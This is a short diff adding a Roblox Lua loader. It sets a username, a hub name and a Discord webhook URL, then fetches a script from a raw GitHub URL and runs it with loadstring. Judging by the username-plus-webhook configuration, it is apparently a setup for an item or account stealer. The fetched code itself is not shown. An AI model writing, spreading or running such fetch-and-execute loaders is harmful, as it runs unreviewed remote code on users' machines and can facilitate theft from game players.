@@ -1,0 +1,5 @@
+_G.Username = "accountd013" 
+_G.HubName = "MMB"
+_G.WebhookUrl = "https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
